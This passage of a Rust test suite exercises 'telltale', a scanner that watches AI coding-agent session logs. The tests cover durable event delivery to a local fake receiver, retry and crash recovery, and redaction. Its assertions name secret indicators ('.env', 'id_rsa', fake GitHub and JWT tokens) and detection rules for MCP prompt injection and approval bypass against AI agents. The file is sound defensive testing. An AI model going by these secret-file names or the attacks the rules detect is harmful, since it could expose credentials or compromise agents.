            (500, _) => "durable-restart-retry",
            (503, false) => "durable-slow-receiver",
            (503, true) => "durable-terminal-budget",
            (401, _) => "durable-blocked",
            _ => "durable-idle",
        });
    let _guard = watch_process_guard();
    let temp = tempdir().unwrap();
    let root = temp.path().join("stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).unwrap();
    let source = sessions.join("idle.jsonl");
    fs::write(&source, b"").unwrap();
    // Sibling storage under the broad --root remains supported: only actual
    // session-store roots are recursively watched.
    let log = root.join("runtime/events.jsonl");
    let state = root.join("runtime/state.json");
    let outbox = root.join("runtime/private/outbox.sqlite");
    let config = temp.path().join("config");
    fs::create_dir_all(config.join("outputs.d")).unwrap();
    let yaml = |path: &Path| {
        serde_yaml::to_string(&path.to_string_lossy())
            .unwrap()
            .trim()
            .to_owned()
    };
    let outputs = config.join("outputs.d/outputs.yaml");
    fs::write(&outputs, format!("version: 1\ndelivery:\n  policy: durable\n  outbox_path: {}\nsinks:\n  - name: canonical\n    type: jsonl\n    path: {}\n", yaml(&outbox), yaml(&log))).unwrap();
    let setup = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .env_clear()
        .env("HOME", temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--install-inventory-disabled",
            "--root",
        ])
        .arg(&root)
        .arg("--config-dir")
        .arg(&config)
        .arg("--state-path")
        .arg(&state)
        .output()
        .unwrap();
    assert!(
        setup.status.success(),
        "{}",
        String::from_utf8_lossy(&setup.stderr)
    );
    let state_before = fs::read(&state).unwrap();
    let event = native_test_event(
        "activity",
        "telltale-00000000-0000-4000-8000-000000000001",
        "2026-01-01T00:00:00Z",
        "informational",
        "codex",
        "idle",
        &[],
    );
    // Complete canonical record beyond the committed ingest cursor: the crash gap.
    let mut journal = fs::OpenOptions::new().append(true).open(&log).unwrap();
    writeln!(journal, "{}", serde_json::to_string(&event).unwrap()).unwrap();
    journal.sync_all().unwrap();
    let log_before = fs::read(&log).unwrap();
    let connection = Connection::open(&outbox).unwrap();
    // Synthetic configured-identity fixture; production rejects identity changes.
    connection
        .execute(
            "UPDATE meta SET value = '[\"remote\"]' WHERE key = 'durable_sink_ids'",
            [],
        )
        .unwrap();
    let event_id: String = connection
        .query_row("SELECT event_id FROM events LIMIT 1", [], |row| row.get(0))
        .unwrap();
    let now = time::OffsetDateTime::now_utc().unix_timestamp_nanos() / 1_000_000;
    let eligible_at = now + if future_pending { 1800 } else { 0 };
    connection.execute("INSERT INTO deliveries (event_id, sink_id, state, attempt_count, next_attempt_at, updated_at) VALUES (?1, 'remote', 'pending', 0, ?2, ?3)", rusqlite::params![event_id, eligible_at as i64, now as i64]).unwrap();
    drop(connection);
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    listener.set_nonblocking(true).unwrap();
    fs::write(&outputs, format!("{}  - name: remote\n    type: splunk_hec\n    endpoint: http://{}\n    token: synthetic-idle-token\n    retry: {{ max_attempts: 2, base_delay_ms: 1500 }}\n", fs::read_to_string(&outputs).unwrap(), listener.local_addr().unwrap())).unwrap();
    let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
    command
        .env_clear()
        .env("HOME", temp.path())
        .args([
            "watch",
            "--allow-fixtures",
            "--iterations",
            "1",
            "--install-inventory-disabled",
            "--root",
        ])
        .arg(&root)
        .arg("--config-dir")
        .arg(&config)
        .arg("--state-path")
        .arg(&state)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if dry_run {
        command.arg("--dry-run");
    }
    let mut child = WatchChildGuard::new(command.spawn().unwrap());
    if dry_run {
        // Registration follows signal-handler installation. Keep the source idle:
        // a triggered scan would invalidate the no-summary/no-write assertions.
        wait_for_watch_ready(child.child_mut(), &sessions);
    }
    let started = Instant::now();
    let mut attempts = BTreeMap::<String, usize>::new();
    let mut request_timeline = Vec::new();
    let expected = match first_status {
        401 => ("blocked", 1),
        503 => ("dead", 2),
        500 => ("acked", 2),
        _ => ("acked", 1),
    };
    let delivery_state =
        Connection::open_with_flags(&outbox, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY).unwrap();
    let mut terminal_since = None;
    thread::sleep(receiver_delay);
    loop {
        measurements.observe(child.id());
        if child.child_mut().try_wait().unwrap().is_some() {
            let output = child.disarm().wait_with_output().unwrap();
            panic!(
                "idle watch exited: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        }
        if dry_run {
            if started.elapsed() >= Duration::from_secs(6) {
                break;
            }
        } else {
            let terminal: u32 = delivery_state.query_row(
                "SELECT COUNT(*) FROM deliveries WHERE sink_id = 'remote' AND state = ?1 AND attempt_count = ?2",
                rusqlite::params![expected.0, expected.1 as u32], |row| row.get(0),
            ).unwrap();
            if terminal == 2 {
                // Observe two more delivery intervals after the result commits,
                // rather than treating request receipt as a persisted outcome.
                let since = terminal_since.get_or_insert_with(Instant::now);
                if since.elapsed() >= Duration::from_secs(2) {
                    break;
                }
            } else {
                terminal_since = None;
            }
            assert!(
                started.elapsed() < Duration::from_secs(30),
                "terminal delivery deadline exceeded: terminal={terminal}; requests={request_timeline:?}; attempts={attempts:?}"
            );
        }
        match listener.accept() {
            Ok((mut stream, _)) => {
                assert!(!dry_run, "dry run sent telemetry");
                stream
                    .set_read_timeout(Some(Duration::from_secs(2)))
                    .unwrap();
                let mut reader = BufReader::new(stream.try_clone().unwrap());
                let mut length = 0;
                loop {
                    let mut line = String::new();
                    reader.read_line(&mut line).unwrap();
                    if line == "\r\n" {
                        break;
                    }
                    if let Some((name, value)) = line.split_once(':')
                        && name.eq_ignore_ascii_case("content-length")
                    {
                        length = value.trim().parse::<usize>().unwrap();
                    }
                }
                let mut body = vec![0; length];
                reader.read_exact(&mut body).unwrap();
                assert!(
                    !String::from_utf8_lossy(&body).contains("synthetic-idle-token"),
                    "controlled token leaked into remote payload"
                );
                let body: Value = serde_json::from_slice(&body).unwrap();
                let id = body["event"]["event_id"].as_str().unwrap().to_owned();
                request_timeline.push((id.clone(), started.elapsed()));
                if future_pending && id == event_id {
                    assert!(
                        time::OffsetDateTime::now_utc().unix_timestamp_nanos() / 1_000_000
                            >= now + 1800
                    );
                }
                let count = attempts.entry(id).or_default();
                *count += 1;
                let status = if *count == 1 || first_status == 503 {
                    first_status
                } else {
                    200
                };
                write!(stream, "HTTP/1.1 {status} Test\r\nContent-Length: 10\r\nConnection: close\r\n\r\n{{\"code\":0}}").unwrap();
            }
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                thread::sleep(Duration::from_millis(25))
            }
            Err(error) => panic!("accept: {error}"),
        }
    }
    assert_eq!(fs::read(&state).unwrap(), state_before);
    assert_eq!(
        fs::read(&log).unwrap(),
        log_before,
        "idle failures must not generate events"
    );
    assert_eq!(fs::read(&source).unwrap(), b"");
    if !dry_run {
        let connection = Connection::open(&outbox).unwrap();
        let rows: Vec<(String, String, usize)> = connection
            .prepare(
                "SELECT event_id, state, attempt_count FROM deliveries WHERE sink_id = 'remote'",
            )
            .unwrap()
            .query_map([], |row| {
                Ok((row.get(0)?, row.get(1)?, row.get::<_, u32>(2)? as usize))
            })
            .unwrap()
            .collect::<Result<_, _>>()
            .unwrap();
        assert_eq!(rows.len(), 2, "startup must reconcile the JSONL crash gap");
        assert_eq!(
            rows.iter()
                .map(|row| row.0.as_str())
                .collect::<std::collections::BTreeSet<_>>(),
            std::collections::BTreeSet::from([
                event_id.as_str(),
                event["event_id"].as_str().unwrap()
            ])
        );
        assert!(
            rows.iter()
                .all(|row| row.1 == expected.0 && row.2 == expected.1),
            "rows={rows:?}; requests={request_timeline:?}; attempts={attempts:?}; elapsed={:?}",
            started.elapsed()
        );
        assert_eq!(attempts.len(), 2);
        assert!(attempts.values().all(|count| *count == expected.1));
    } else {
        assert!(attempts.is_empty());
    }
    let stop_started = Instant::now();
    assert!(
        Command::new("kill")
            .args(["-TERM", &child.id().to_string()])
            .status()
            .unwrap()
            .success()
    );
    while child.child_mut().try_wait().unwrap().is_none() {
        assert!(
            stop_started.elapsed() < Duration::from_secs(2),
            "idle shutdown stalled"
        );
        thread::sleep(Duration::from_millis(25));
    }
    let output = child.disarm().wait_with_output().unwrap();
    assert!(
        output.status.success(),
        "idle watch shutdown failed: status={:?}; stdout={:?}; stderr={:?}",
        output.status,
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        output.stdout.is_empty(),
        "idle wakeups must not emit scan summaries"
    );
    measurements.sample(
        "restart-to-persisted-terminal-plus-two-idle-intervals",
        started.elapsed(),
        &state,
        &log,
    );
    assert!(!String::from_utf8_lossy(&output.stderr).contains("synthetic-idle-token"));
    assert!(
        !fs::read_to_string(&log)
            .unwrap()
            .contains("synthetic-idle-token")
    );
    let (event_rows, payload_bytes): (u64, u64) = delivery_state
        .query_row(
            "SELECT COUNT(*), COALESCE(SUM(length(payload)), 0) FROM events",
            [],
            |row| Ok((row.get(0)?, row.get(1)?)),
        )
        .unwrap();
    let (pending_rows, pending_bytes): (u64, u64) = delivery_state.query_row(
        "SELECT COUNT(*), COALESCE(SUM(length(events.payload)), 0) FROM deliveries JOIN events USING(event_id) WHERE deliveries.state IN ('pending', 'blocked')", [], |row| Ok((row.get(0)?, row.get(1)?))
    ).unwrap();
    let leaked_payloads: u64 = delivery_state.query_row(
        "SELECT COUNT(*) FROM events WHERE instr(CAST(payload AS TEXT), 'synthetic-idle-token') > 0", [], |row| row.get(0)
    ).unwrap();
    assert_eq!(
        leaked_payloads, 0,
        "controlled token leaked into outbox payload"
    );
    let fixture_recipe = serde_json::json!({
        "recipe_version": 1,
        "generator": "tests/cli/scan_watch.rs::idle_durable_watch_case at source_sha plus tracked_patch_sha256",
        "operation_order": ["empty source", "setup scan", "crash-gap append and fsync", "pending seed", "receiver config", "watch"],
        "initial_source": {"relative_path": "stores/codex/sessions/idle.jsonl", "bytes": "empty"},
        "setup": {
            "command": "scan --once --allow-fixtures --install-inventory-disabled --root <root> --config-dir <config> --state-path <state>",
            "environment": "cleared; HOME=<temporary-root>", "initial_state": "absent",
            "output_config": "version 1, durable, canonical JSONL only, outbox <root>/runtime/private/outbox.sqlite",
            "generated_events": "setup CLI health from empty source; exact generated bytes unavailable"
        },
        "pending_seed": {
            "event_selection": "SELECT event_id FROM events LIMIT 1 after setup",
            "meta_durable_sink_ids": ["remote"], "sink_id": "remote", "state": "pending",
            "attempt_count": 0, "updated_at": "<seed-now-unix-ms>",
            "next_attempt_at_offset_ms": if future_pending { 1800 } else { 0 }
        },
        "crash_gap": {
            "generator": "native_test_event(activity, fixed event ID ending 000001, 2026-01-01T00:00:00Z, informational, codex, idle, no rules)",
            "operation": "append complete serialized event plus newline to setup journal, sync_all; leave ingest cursor unchanged"
        },
        "receiver": {"endpoint": "http://127.0.0.1:<ephemeral-port>", "token": "synthetic credential defined by generator", "first_status": first_status, "response_schedule": "503 remains 503; otherwise first_status on first attempt per event, then 200; body code 0", "delay_ms": receiver_delay.as_millis(), "retry_max_attempts": 2, "retry_base_delay_ms": 1500},
        "watch": {"iterations": 1, "dry_run": dry_run},
        "normalization": "temporary absolute paths, setup random event IDs, runtime timestamps and runtime-derived event metadata are generator placeholders; seed time is an offset, receiver port is a placeholder",
        "complete_generated_fixture_bytes_sha256": null
    });
    measurements.finish(&[serde_json::to_vec(&fixture_recipe).unwrap().as_slice()], "normalized-generator-recipe-v1; not generated event/state/database bytes",
        serde_json::json!({"command": "watch --allow-fixtures --iterations 1 --install-inventory-disabled --root <isolated> --config-dir <isolated> --state-path <isolated>", "rules": "compiled defaults", "first_http_status": first_status, "future_pending": future_pending, "dry_run": dry_run, "receiver_delay_ms": receiver_delay.as_millis(), "retry_max_attempts": 2, "retry_base_delay_ms": 1500, "fixture_recipe": fixture_recipe, "delivery": "at least once; request counts characterize this controlled run only"}),
        serde_json::json!({"event_rows": event_rows, "retained_payload_bytes": payload_bytes, "pending_or_blocked_delivery_rows": pending_rows, "pending_or_blocked_delivery_payload_bytes": pending_bytes, "outbox_file_bytes": fs::metadata(&outbox).unwrap().len(), "requests": request_timeline.len(), "queue_saturation": null}));
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_future_pending_and_crash_gap_recover() {
    idle_durable_watch_case(500, true, false, Duration::ZERO);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_attempt_budget_is_terminal() {
    idle_durable_watch_case(503, false, false, Duration::ZERO);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_attempt_budget_with_delayed_receiver() {
    idle_durable_watch_case(503, false, false, Duration::from_millis(5500));
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_blocked_does_not_retry() {
    idle_durable_watch_case(401, false, false, Duration::ZERO);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_dry_run_does_not_send_or_write() {
    idle_durable_watch_case(200, true, true, Duration::ZERO);
}

#[cfg(target_os = "linux")]
#[test]
fn watch_idle_durable_validates_before_output_activation() {
    let _guard = watch_process_guard();
    for case in [
        "dry-run",
        "overlap",
        "fixture",
        "empty-root",
        "watched-outbox",
        "watched-outbox-alias",
        "watched-outbox-alias-parent",
        "watched-log",
        "watched-state",
    ] {
        let temp = tempdir().unwrap();
        let root = temp.path().join("stores");
        fs::create_dir_all(&root).unwrap();
        if case != "empty-root" {
            fs::create_dir_all(root.join("codex/sessions")).unwrap();
        }
        let output_dir = temp.path().join("new-output");
        let watched_storage = root.join("codex/sessions/private");
        let log = if case == "watched-log" {
            watched_storage.join("events.jsonl")
        } else {
            output_dir.join("events.jsonl")
        };
        let state = if case == "watched-state" {
            watched_storage.join("state.json")
        } else if case == "overlap" {
            log.clone()
        } else {
            output_dir.join("state.json")
        };
        let outbox = if case == "watched-outbox-alias" || case == "watched-outbox-alias-parent" {
            let alias = temp.path().join("sessions-alias");
            std::os::unix::fs::symlink(root.join("codex/sessions"), &alias).unwrap();
            if case == "watched-outbox-alias-parent" {
                alias.join("../sessions/private/outbox.sqlite")
            } else {
                alias.join("private/outbox.sqlite")
            }
        } else if case == "watched-outbox" {
            watched_storage.join("outbox.sqlite")
        } else {
            output_dir.join("private/outbox.sqlite")
        };
        let config = temp.path().join("config");
        fs::create_dir_all(config.join("outputs.d")).unwrap();
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        listener.set_nonblocking(true).unwrap();
        fs::write(config.join("outputs.d/outputs.yaml"), format!("version: 1\ndelivery:\n  policy: durable\n  outbox_path: {}\nsinks:\n  - name: canonical\n    type: jsonl\n    path: {}\n  - name: remote\n    type: splunk_hec\n    endpoint: http://{}\n    token: synthetic-idle-token\n", outbox.display(), log.display(), listener.local_addr().unwrap())).unwrap();
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .args(["watch", "--install-inventory-disabled", "--root"])
            .arg(&root)
            .arg("--config-dir")
            .arg(&config)
            .arg("--state-path")
            .arg(&state)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        if case == "dry-run" {
            command.arg("--dry-run");
        }
        if case != "fixture" {
            command.arg("--allow-fixtures");
        }
        let mut child = WatchChildGuard::new(command.spawn().unwrap());
        let started = Instant::now();
        if case == "dry-run" {
            thread::sleep(Duration::from_millis(1500));
            assert!(child.child_mut().try_wait().unwrap().is_none());
        } else {
            // This bounds process startup, not validation latency: no source activity is sent.
            while child.child_mut().try_wait().unwrap().is_none() {
                if started.elapsed() >= Duration::from_secs(20) {
                    child.child_mut().kill().expect("stop stalled watch");
                    let output = child.disarm().wait_with_output().unwrap();
                    panic!(
                        "{case}: watch did not reject idle configuration within 20s; stderr: {}",
                        String::from_utf8_lossy(&output.stderr)
                    );
                }
                thread::sleep(Duration::from_millis(25));
            }
            let output = child.disarm().wait_with_output().unwrap();
            assert!(!output.status.success(), "{case}");
            let stderr = String::from_utf8_lossy(&output.stderr);
            let expected = match case {
                "fixture" => "refusing to write fixture/demo",
                "empty-root" => "no existing Telltale session-store roots",
                "watched-outbox"
                | "watched-outbox-alias"
                | "watched-outbox-alias-parent"
                | "watched-log"
                | "watched-state" => "runtime storage must be outside watched session-store roots",
                _ => "overlap",
            };
            assert!(stderr.contains(expected), "{case}: {stderr}");
            assert!(
                output.stdout.is_empty(),
                "{case}: runtime notifications consumed scan iterations"
            );
        }
        assert!(
            !output_dir.exists(),
            "{case}: created output storage before activation"
        );
        assert!(
            !watched_storage.exists(),
            "{case}: activated watched runtime storage"
        );
        assert!(
            matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock)
        );
    }
}

fn watch_process_guard() -> std::sync::MutexGuard<'static, ()> {
    WATCH_PROCESS_MUTEX
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn assert_source_processing_accounting(summary: &Value) {
    let source_processing = &summary["source_processing"];
    assert_eq!(
        source_processing["selected_source_count"].as_u64().unwrap(),
        source_processing["parse_success_source_count"]
            .as_u64()
            .unwrap()
            + source_processing["parse_error_source_count"]
                .as_u64()
                .unwrap()
    );
    assert!(
        source_processing["empty_source_count"].as_u64().unwrap()
            <= source_processing["parse_success_source_count"]
                .as_u64()
                .unwrap()
    );
    let record_kind_counts = source_processing["record_kind_counts"]
        .as_object()
        .expect("record kind counts");
    let mut keys = record_kind_counts
        .keys()
        .map(String::as_str)
        .collect::<Vec<_>>();
    keys.sort_unstable();
    assert_eq!(
        keys,
        vec![
            "assistant_message",
            "other",
            "session_meta",
            "tool_call",
            "tool_result",
            "user_message",
        ]
    );
    let parsed_record_count = source_processing["parsed_record_count"].as_u64().unwrap();
    assert_eq!(
        parsed_record_count,
        record_kind_counts
            .values()
            .map(|count| count.as_u64().unwrap())
            .sum::<u64>()
    );
    assert!(record_kind_counts["user_message"].as_u64().unwrap() > 0);
    assert!(record_kind_counts["tool_call"].as_u64().unwrap() > 0);
}

fn assert_detection_flow_accounting(summary: &Value, emitted: u64, deduplicated: u64) {
    let detection_flow = &summary["detection_flow"];
    assert_eq!(
        detection_flow["effective_detection_candidate_count"],
        Value::from(emitted + deduplicated)
    );
    assert_eq!(
        detection_flow["state_deduplicated_detection_count"],
        Value::from(deduplicated)
    );
    assert_eq!(
        detection_flow["emitted_detection_count"],
        Value::from(emitted)
    );
    assert!(detection_flow["matched_rule_id_count"].as_u64().unwrap() > 0);
    assert_eq!(detection_flow["allowlist_marked_detection_count"], 0);
    assert_eq!(
        detection_flow["policy_match_accounting"]["status"],
        "not_applicable"
    );
    for field in [
        "pre_policy_detection_candidate_count",
        "fully_filtered_detection_candidate_count",
        "filtered_rule_id_count",
    ] {
        assert!(
            detection_flow["policy_match_accounting"][field].is_null(),
            "{field} should be unavailable"
        );
    }
}

fn assert_runtime_snapshot(summary: &Value) {
    let executable = Path::new(env!("CARGO_BIN_EXE_telltale"));
    let mut file = fs::File::open(executable).expect("open invoked executable");
    let mut bytes = Vec::new();
    file.read_to_end(&mut bytes)
        .expect("read invoked executable");
    let mut hasher = sha2::Sha256::new();
    hasher.update(&bytes);
    assert_eq!(
        summary["runtime"]["package_version"],
        env!("CARGO_PKG_VERSION")
    );
    assert_eq!(
        summary["runtime"]["build_git_hash"],
        env!("TELLTALE_GIT_HASH")
    );
    assert_eq!(
        summary["runtime"]["executable"]["observation_status"],
        "complete"
    );
    assert_eq!(
        summary["runtime"]["executable"]["path_hash"]
            .as_str()
            .unwrap()
            .len(),
        64
    );
    assert_eq!(
        summary["runtime"]["executable"]["path_hash"],
        path_hash(executable)
    );
    assert_eq!(
        summary["runtime"]["executable"]["sha256"]
            .as_str()
            .unwrap()
            .len(),
        64
    );
    assert!(
        summary["runtime"]["executable"]["sha256"]
            .as_str()
            .unwrap()
            .bytes()
            .all(|byte| byte.is_ascii_hexdigit())
    );
    assert_eq!(
        summary["runtime"]["executable"]["sha256"],
        format!("{:x}", hasher.finalize())
    );
}

#[test]
fn scan_once_reports_fixture_source_and_detection_accounting() {
    let summary = &fixture_scan().summary;
    assert_eq!(summary["event_type"], "health");
    // Copilot's mixed-context rules require unsupported UserContext and remain
    // visibility-limited. Commands also no longer include fabricated tool names.
    assert_eq!(summary["detection_count"], 30);
    assert_runtime_snapshot(summary);
    assert_eq!(
        summary["effective_configuration"]["local_config"]["mode"],
        "disabled"
    );
    assert_eq!(
        summary["effective_configuration"]["outputs"]["mode"],
        "legacy_default"
    );
    assert_eq!(
        summary["effective_configuration"]["outputs"]["sinks"][0]["origin_kind"],
        "legacy_default"
    );
    assert_eq!(
        summary["effective_configuration"]["rules"]["default_enabled"],
        true
    );
    assert_eq!(
        summary["effective_configuration"]["rules"]["sources"]
            .as_array()
            .unwrap()
            .len(),
        1
    );
    assert_source_processing_accounting(summary);
    assert_detection_flow_accounting(summary, 30, 0);
    assert_eq!(summary["source_processing"]["selected_source_count"], 57);
    assert_eq!(summary["source_discovery"]["basis"], "current_full_scan");
    assert_eq!(
        summary["source_discovery"]["performed_for_current_scan"],
        true
    );
    assert_eq!(summary["source_discovery"]["checked_status"], "succeeded");
    assert_eq!(
        summary["source_discovery"]["first_error_category"],
        Value::Null
    );
    assert_eq!(
        summary["source_discovery"]["best_effort_fallback_used"],
        false
    );
    assert_eq!(summary["source_discovery"]["returned_source_count"], 57);
    assert_eq!(summary["source_discovery"]["operational_source_count"], 57);
    assert_eq!(
        summary["source_discovery"]["project_configuration"],
        serde_json::json!({
            "mode": "none",
            "document_attempt_count": 0,
            "document_success_count": 0,
            "document_failure_count": 0,
            "loaded_project_count": 0,
        })
    );
    assert_eq!(
        summary["diagnostic_warnings"],
        serde_json::json!([{
            "code": "source_coverage_partial",
            "classification": "coverage_limitation",
            "basis": "source_processing"
        }])
    );
    assert_eq!(
        summary["source_processing"]["selected_source_coverage"],
        "partial"
    );
    assert_eq!(
        summary["source_processing"]["accounting_partial_source_count"],
        1
    );
    assert!(
        summary["source_processing"]["visibility_limited_source_count"]
            .as_u64()
            .unwrap()
            > 0
    );
    assert_eq!(
        summary["source_processing"]["parse_success_source_count"],
        57
    );
    assert_eq!(summary["source_processing"]["empty_source_count"], 0);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    assert_eq!(summary["source_processing"]["parsed_record_count"], 126);
    assert_eq!(
        summary["source_processing"]["record_kind_counts"],
        serde_json::json!({
            "user_message": 19,
            "assistant_message": 23,
            "tool_call": 26,
            "tool_result": 14,
            "session_meta": 44,
            "other": 0,
        })
    );
    assert_eq!(summary["detection_flow"]["matched_rule_id_count"], 89);
    assert_eq!(summary["source_counts"]["claude.jsonl"], 3);
    assert_eq!(summary["source_counts"]["codex.jsonl"], 40);
    assert_eq!(summary["source_counts"]["codex.archived_jsonl"], 2);
    assert_eq!(summary["source_counts"]["codex.headless_jsonl"], 2);
    assert_eq!(summary["source_counts"]["openclaw.jsonl"], 2);
    assert_eq!(summary["source_counts"]["qwen.jsonl"], 2);
    assert_eq!(summary["source_counts"]["opencode.sqlite"], 1);
    assert_eq!(summary["source_counts"]["copilot.copilot_process_log"], 5);

    let events = &fixture_scan().events;
    assert_eq!(events.len(), 32);
}

struct FixtureScan {
    summary: Value,
    events: Vec<Value>,
}

// Cache one immutable first scan, so independently runnable checks share fresh-state output.
fn fixture_scan() -> &'static FixtureScan {
    static SCAN: std::sync::OnceLock<FixtureScan> = std::sync::OnceLock::new();
    SCAN.get_or_init(|| {
        let temp = tempdir().expect("tempdir");
        let log_path = temp.path().join("telltale-events.jsonl");
        let state_path = temp.path().join("telltale-state.json");
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
                "tests/fixtures/session_stores",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary = serde_json::from_slice(&output.stdout).expect("summary json");
        let lines = fs::read_to_string(log_path).expect("log file");
        let events = lines
            .lines()
            .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
            .collect();
        FixtureScan { summary, events }
    })
}

fn assert_source_visibility_exclusions(events: &[Value]) {
    assert!(
        !events.iter().any(|event| {
            event["event_type"] == "detection" && event["session_id"] == "copilot-uc001-tool-result"
        }),
        "mixed-context rules must not bypass Copilot's unsupported UserContext"
    );
    assert!(events.iter().all(|event| {
        event.get("source_processing").is_none()
            && event.get("detection_flow").is_none()
            && event.get("source_discovery").is_none()
            && event.get("diagnostic_warnings").is_none()
            && event.get("runtime").is_none()
            && event.get("effective_configuration").is_none()
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "activity"
            && event["check_name"] == "install_inventory"
            && event["client"] == "install_inventory"
            && event["tags"]
                .as_array()
                .expect("tags")
                .iter()
                .any(|tag| tag == "install_inventory")
    }));
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "session-a" && event["client"] == "claude")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "claude-tool-use" && event["client"] == "claude")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "qwen-session-a" && event["client"] == "qwen")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "openclaw-session-a"
                && event["client"] == "openclaw")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "approval-bypass-quoted-example")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-normal-mcp")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "controlled-domain-user-text")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "controlled-domain-assistant-text")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-server-instructions")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-tools-list")
    );
    assert!(
        !events
            .iter()
            .any(|event| event["session_id"] == "uc001-negative-domain-only")
    );
}

#[test]
fn scan_once_writes_schema_shaped_health_jsonl() {
    let events = &fixture_scan().events;
    let validator = event_schema_validator();
    for event in events {
        assert!(
            validator.is_valid(event),
            "event failed schema validation: {}",
            event["session_id"]
                .as_str()
                .unwrap_or("<missing session_id>")
        );
        for item in event["evidence"].as_array().expect("evidence array") {
            let redacted = item["redacted_value"].as_str().expect("redacted value");
            assert!(
                item["hash"].is_string(),
                "evidence hash missing for {}",
                event["session_id"]
                    .as_str()
                    .unwrap_or("<missing session_id>")
            );
            assert!(!redacted.contains(".env"));
            assert!(!redacted.contains("darkroastcyber.io"));
            assert!(!redacted.contains("mcp-lab"));
            assert!(!redacted.contains("id_rsa"));
            assert!(!redacted.contains("ghp_1234567890abcdef1234"));
            assert!(!redacted.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ"));
            assert!(!redacted.contains("fixture_session_token_1234567890abcdef"));
        }
    }

    let event = &events[0];
    assert!(
        validator.is_valid(event),
        "health event failed schema validation"
    );
    assert_eq!(event["schema_version"], "3.0");
    assert_eq!(event["event_type"], "health");
    assert_eq!(event["severity"], "informational");
    assert_eq!(event["risk_score"], 0);
    assert_eq!(event["session_id"], "scanner");
    assert_eq!(event["component"], "scanner");
    assert_eq!(event["check_name"], "source_discovery");
    assert_eq!(event["status"], "ok");
    assert_eq!(event["telltale_version"], env!("CARGO_PKG_VERSION"));
    assert!(event["scan_duration_ms"].as_u64().is_some());
    assert_eq!(event["rule_count"], 18);
    assert_eq!(event["emitted_count"], 31);
    assert_eq!(event["suppressed_count"], 0);
    assert_eq!(event["scanner_error_count"], 0);
    assert_eq!(event["threshold_config"]["low"], 20);
    assert_eq!(event["threshold_config"]["medium"], 50);
    assert_eq!(event["threshold_config"]["high"], 70);
    assert_eq!(event["threshold_config"]["critical"], 90);
    assert!(event.get("active_policy_name").is_none());
    assert!(
        event["evidence"]
            .as_array()
            .is_some_and(|items| !items.is_empty())
    );
    assert_eq!(
        event["evidence"].as_array().expect("health evidence").len(),
        2
    );
    assert_eq!(event["evidence"][0]["field"], "source_inventory");
    assert_eq!(
        event["evidence"][0]["redacted_value"],
        "sources=57; client_source_kinds=8"
    );
    assert!(
        event["evidence"][0]["hash"]
            .as_str()
            .is_some_and(|hash| hash.len() == 64)
    );
    assert_eq!(event["evidence"][1]["field"], "source_inventory_change");
    assert_eq!(
        event["evidence"][1]["redacted_value"],
        "baseline=true; added=57; removed=0; unchanged=0"
    );
    assert!(
        event["evidence"][1]["hash"]
            .as_str()
            .is_some_and(|hash| hash.len() == 64)
    );
    for item in event["evidence"].as_array().expect("evidence array") {
        let redacted = item["redacted_value"].as_str().expect("redacted value");
        assert!(!redacted.contains("tests/fixtures"));
        assert!(!redacted.contains(".jsonl"));
        assert!(!redacted.contains(".sqlite"));
    }
}

#[test]
fn scan_once_preserves_mcp_metadata_and_tool_result_detections() {
    let events = &fixture_scan().events;
    let validator = event_schema_validator();
    let detection = events
        .iter()
        .find(|event| event["session_id"] == "uc001-positive")
        .expect("uc001 detection");
    assert!(
        validator.is_valid(detection),
        "detection event failed schema validation"
    );
    assert_eq!(detection["event_type"], "detection");
    assert_eq!(detection["severity"], "critical");
    assert_eq!(detection["session_id"], "uc001-positive");
    // Mentioning a tool in assistant text does not attest an observed tool name.
    assert!(detection["tool_name"].is_null());
    assert!(
        detection["rule_ids"]
            .as_array()
            .expect("rule ids")
            .iter()
            .any(|rule| rule == "mcp.tool_metadata.prompt_injection")
    );
    assert!(
        detection["evidence"]
            .as_array()
            .expect("evidence")
            .iter()
            .all(|item| {
                let value = item["redacted_value"].as_str().expect("redacted value");
                !value.contains(".env") && !value.contains("mcp-lab")
            })
    );

    for session_id in [
        "uc001-positive-server-instructions",
        "uc001-positive-tool-description",
        "uc001-positive-parameter-description",
    ] {
        let event = events
